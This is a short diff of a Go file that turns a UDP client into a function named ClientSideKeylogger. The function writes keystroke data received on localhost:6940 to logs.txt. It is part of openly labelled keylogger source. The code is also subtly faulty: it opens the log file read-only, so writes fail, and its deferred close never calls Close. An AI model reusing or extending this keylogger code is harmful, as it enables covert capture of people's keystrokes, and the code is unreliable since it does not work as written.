@@ -1,13 +1,26 @@
-package main
+package client
 
 import (
 	"fmt"
 	"net"
+	"os"
 )
 
 const maxBuffer = 1024
 
-func main() {
+func ClientSideKeylogger() {
+
+	file, err := os.Open("logs.txt")
+	if err != nil {
+		panic(err)
+	}
+
+	defer func() {
+		if err := file.Close; err != nil {
+			panic(err)
+		}
+	}()
+
 	fmt.Println("Starting client...")
 	saddr, err := net.ResolveUDPAddr("udp", "localhost:6940")
 	if err != nil {
@@ -31,7 +44,9 @@ func main() {
 			return
 		}
 		if data > 0 {
-			fmt.Printf("Key: %s\n", string(buffer[:data]))
+			keys := string(buffer[:data])
+			fmt.Printf("Key: %s\n", keys)
+			file.Write(buffer[:data])
 		}
 	}
 }
